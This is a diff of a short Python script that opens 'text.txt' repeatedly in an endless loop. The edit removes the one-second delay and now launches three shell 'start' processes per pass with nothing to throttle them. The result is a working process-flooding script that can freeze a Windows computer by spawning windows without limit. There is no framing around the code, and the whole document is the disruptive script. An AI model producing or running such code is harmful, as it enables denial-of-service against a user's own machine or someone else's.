@@ -1,12 +1,5 @@
-import os
-import time
+import subprocess
 
 while True:
-    os.system("start text.txt")
-    os.system("start text.txt")
-    os.system("start text.txt")
-    os.system("start text.txt")
-    os.system("start text.txt")
-    os.system("start text.txt")
-    os.system("start text.txt")
-    time.sleep(1) # Shortened delay to 1 second
+    for _ in range(3):  # Open the file 3 times in each iteration
+        subprocess.Popen(["start", "text.txt"], shell=True)
